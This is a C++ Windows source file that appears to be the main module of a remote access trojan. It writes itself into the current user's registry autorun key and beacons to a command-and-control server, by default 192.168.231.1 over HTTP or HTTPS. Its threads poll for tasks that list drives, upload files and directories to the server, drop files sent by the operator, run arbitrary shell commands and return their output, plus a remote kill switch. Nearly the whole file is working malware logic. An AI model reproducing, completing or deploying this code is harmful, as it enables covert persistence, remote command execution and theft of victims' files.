

#include <windows.h>

#include "public.h"

#include "http.h"

#include "https.h"

#include "uuid.h"
#include "packet.h"
#include "FileHelper.h"

#include "file.h"
#include "shell.h"

#include "mission.h"

#include "json.h"
#include "utils.h"

#include "RegHelper.h"

#include "main.h"

#pragma comment(lib,"ws2_32.lib")


HANDLE g_mutex_handle = 0;



int getConfig() {
	MyJson j(JSON_CONFIG_FILENAME);
	int pos = 0;

	int ret = 0;

	string dead = j.getjsonValue(KEYNAME_DEAD_STATUS, JSON_TYPE_STRING, &pos);
	if (dead != "" ) {
		if (dead == "true" || dead == "TRUE")
		{
			ExitProcess(0);
		}
		else {
			int v = atoi(dead.c_str());
			if (v)
			{
				ExitProcess(0);
			}
		}
	}

	string ip = j.getjsonValue(KEYNAME_SERVER_IP, JSON_TYPE_STRING, &pos);
	if (ip != "")
	{
		g_ip = inet_addr(ip.c_str());
	}
	else {
		g_ip = inet_addr("192.168.231.1");
	}

	string https = j.getjsonValue(KEYNAME_HTTPS, JSON_TYPE_STRING, &pos);
	if (https != "")
	{
		if (https == "true" || https == "TRUE")
		{
			g_httpsToggle = TRUE;
		}
		else {
			g_httpsToggle = atoi(https.c_str());
		}	
	}
	else {
		g_httpsToggle = FALSE;
	}

	string interval = j.getjsonValue(KEYNAME_HEARTBEART_INTERVAL, JSON_TYPE_STRING, &pos);
	if (interval !="")
	{
		g_interval = atoi(interval.c_str()) * 1000;
	}
	else {
		g_interval = HEART_BEAT_TEST_INTERVAL;
	}

	string uploadsize = j.getjsonValue(KEYNAME_FILE_SIZE, JSON_TYPE_STRING, &pos);
	if (uploadsize != "")
	{
		g_fsize_limit = atoi(uploadsize.c_str()) * 1024 * 1024;
	}
	else {
		g_fsize_limit = MAX_UPLOAD_FILESIZE;
	}

	return 0;
}


int init() {
	int ret = 0;

	g_mutex_handle = bRunning(&ret);
	if (ret)
	{
		ExitProcess(0);
	}

	ret = getConfig();

	WSAData wsa;	
	ret = WSAStartup(0x0202, &wsa);

	ret = getUUID();

	char szpath[1024];
	GetModuleFileNameA(0, szpath, sizeof(szpath));
	ret = setRegBootRun(HKEY_CURRENT_USER, szpath);

	return ret;
}



int clear() {
	int ret = 0;
	ret = WSACleanup();

	return ret;
}



int mytestfunc() {
	int ret = 0;

	//ret = uploadHttpsFile("test.txt");

	PacketParcel https(TRUE);

	ret = https.postCmd(CMD_ONLINE,0,0);

	ret = https.postFile("test.txt", MISSION_TYPE_FILE);

	ret = https.postCmd(CMD_QUERY_OPERATOR,0,0);

	return 0;

	PacketParcel http(TRUE);

	ret = http.postCmd(CMD_ONLINE,0,0);

	ret = http.postFile("test.txt", MISSION_TYPE_FILE);

	ret = http.postCmd(CMD_QUERY_OPERATOR, 0, 0);

	return ret;
}



int getProc() {
	int ret = 0;

// 	WCHAR url[1024];
// 	WCHAR wstruuid[256];
// 	mbstowcs(wstruuid, g_uuid, sizeof(wstruuid));
// 	WCHAR wstrcmd[256];
// 	mbstowcs(wstrcmd, CMD_ONLINE, sizeof(wstrcmd));
// 	wsprintfW(url, L"/%ws?Data%ws%c%wsData", MY_PHP_SERVER, wstrcmd, (unsigned char)g_uuid_len, wstruuid);

	PacketParcel packet(FALSE);

	ret = packet.m_protocol->getCmd(CMD_ONLINE);

	while (TRUE)
	{
		ret = packet.m_protocol->getCmd(CMD_QUERY_OPERATOR);
		if (packet.m_protocol->m_respLen == 4 && *(DWORD*)packet.m_protocol->m_resp== INVALID_RESPONSE)
		{

		}
		else if(memcmp(packet.m_protocol->m_resp,CMD_SEND_DD_DATA,sizeof(CMD_SEND_DD_DATA)) == 0){
			PACKET_DATA_HEADER* file = (PACKET_DATA_HEADER*)packet.m_protocol->m_resp;

		}
	}

	return ret;
}




int __stdcall fileMission() {

	int ret = 0;

	PacketParcel packet(TRUE);

	while (TRUE)
	{
		ret = packet.postCmdFile(CMD_GET_DD_DATA, "",0);
		int datalen = packet.m_protocol->m_respLen;
		char* data = packet.m_protocol->m_resp;
		if (datalen == 4 && *(DWORD*)data == INVALID_RESPONSE)
		{

		}
		else if (datalen > 4 && memcmp(data, CMD_SEND_DD_DATA, lstrlenA(CMD_SEND_DD_DATA)) == 0) {

			int recordfn = *(data + 4);
			char* ptr = data + 4;
			ptr = ptr + 1 + recordfn;

			MY_CMD_PACKET* pack = (MY_CMD_PACKET*)ptr;

			if (pack->type == MISSION_TYPE_DRIVE) {
				char drivers[128];
				int drivers_len = getDrivers(drivers, sizeof(drivers));

				char* sendbuf = buildCmd(drivers, drivers_len, MISSION_TYPE_DRIVE);

				ret = packet.postCmd(CMD_SEND_DRIVER, sendbuf, drivers_len+sizeof(MY_CMD_PACKET));

				delete sendbuf;
			}
			else if (pack->type == MISSION_TYPE_FILE || pack->type == MISSION_TYPE_DIR)
			{
				*(pack->value + pack->len) = 0;
				ret = packet.postFile(pack->value,pack->type);
			}
			else if (pack->type == COMMAND_TYPE_TERMINATE)
			{
				int subcmd = *(int*)((char*)pack + sizeof(MY_CMD_PACKET));
				if (subcmd == COMMAND_TYPE_TERMINATE)
				{
				}
				MyJson json(JSON_CONFIG_FILENAME);
				json.insert(KEYNAME_DEAD_STATUS, "true", JSON_TYPE_STRING);
				json.saveFile();

				//ret = packet.postCmd(CMD_GET_CMD, 0, 0);

				ExitProcess(0);
			}
			else if (pack->type == COMMAND_TYPE_HEARTBEAT)
			{
				string s = string(pack->value, pack->len);
				int sec = atoi(s.c_str());
				g_interval = sec*1000;
				MyJson json(JSON_CONFIG_FILENAME);
				json.insert(KEYNAME_HEARTBEART_INTERVAL, s.c_str(), JSON_TYPE_STRING);
				json.saveFile();
			}
			else if (pack->type == MISSION_TYPE_UPLOAD)
			{
				string fn = string(pack->value, pack->len);
				MY_CMD_PACKET * pack2 = (MY_CMD_PACKET*)((char*)pack + sizeof(MY_CMD_PACKET) + pack->len);
				char* file = pack2->value;
				int filesize = pack2->len;
				int ret = FileHelper::fileWriter(fn.c_str(), file, filesize, TRUE);
			}
			datalen = packet.m_protocol->m_respLen;
			data = packet.m_protocol->m_resp;
			if (datalen >= 4 && *(int*)data == DATA_PACK_TAG)
			{

			}
		}

		Sleep(g_interval);
	}

	return 0;
}


int __stdcall cmdMission() {
	int ret = 0;

	PacketParcel packet(TRUE);

	while (TRUE)
	{
		ret = packet.postCmd(CMD_GET_CMD, 0,0);

		int datalen = packet.m_protocol->m_respLen;
		char* data = packet.m_protocol->m_resp;

		if (datalen == 4 && *(DWORD*)data == INVALID_RESPONSE)
		{

		}
		else if (memcmp(data, CMD_SEND_CMD, lstrlenA(CMD_SEND_CMD)) == 0) {
			//IN_PACKET_HEADER* pack = (IN_PACKET_HEADER*)data;

			//int hostlen = pack->hostname_len;

			MY_CMD_PACKET* inpack = (MY_CMD_PACKET*)(data + lstrlenA(CMD_SEND_CMD));

			int cmdlen = inpack->len;

			char* cmd = new char[(ULONGLONG)cmdlen + 16];

			memcpy(cmd, inpack->value,cmdlen);
			cmd[cmdlen] = 0;

			ret = shell(cmd);

			char* file = 0;
			int filesize = 0;
			ret = FileHelper::fileReader(CMD_RESULT_FILENAME, &file, &filesize);

			char* resdata = buildCmd(file, filesize, MISSION_TYPE_FILE);

			if (file)
			{
				delete file;
			}

			ret = packet.postCmd(CMD_SEND_CMD_RESULT, resdata, sizeof(MY_CMD_PACKET) + filesize);

			datalen = packet.m_protocol->m_respLen;
			data = packet.m_protocol->m_resp;

			if (resdata)
			{
				delete resdata;
			}

			DeleteFileA(CMD_RESULT_FILENAME);

			continue;
		}
		Sleep(g_interval);
	}
	
	return 0;
}







//compress,encrypt functions

int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd) 
{
	int ret = 0;
	ret = init();

	//ret = mainProc();

// 	HANDLE ht = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)getAllFiles, 0, 0, 0);
// 	if (ht)
// 	{
// 		CloseHandle(ht);
// 	}

	HANDLE htf = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)fileMission, 0, 0, 0);
	if (htf)
	{
		CloseHandle(htf);
	}
	HANDLE htc = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)cmdMission, 0, 0, 0);
	if (htc)
	{
		CloseHandle(htc);
	}

	while (TRUE)
	{

		PacketParcel packet(TRUE);

		ret = packet.postCmd(CMD_ONLINE, 0, 0);

		Sleep(HEART_BEAT_INTERVAL);
	}	

	ret = clear();

	return 0;
}